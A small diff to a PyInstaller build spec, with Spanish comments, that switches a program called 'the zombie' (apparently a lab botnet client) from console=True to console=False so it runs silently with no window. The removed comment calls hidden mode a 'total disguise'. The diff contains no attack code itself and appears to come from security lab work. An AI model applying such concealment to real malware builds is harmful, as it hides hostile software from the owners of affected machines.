@@ -39,9 +39,10 @@ exe = EXE(
     upx=True,
     upx_exclude=[],
     runtime_tmpdir=None,
-    # Para el laboratorio se deja console=True (se ve la salida del zombie).
-    # Cambiar a console=False oculta la ventana por completo (disfraz total).
-    console=True,
+    # Sin ventana: el zombie corre en silencio (los prints se descartan
+    # mediante el shim de src/main.py). Cambiar a console=True para ver
+    # la salida durante pruebas del laboratorio.
+    console=False,
     disable_windowed_traceback=False,
     argv_emulation=False,
     target_arch=None,
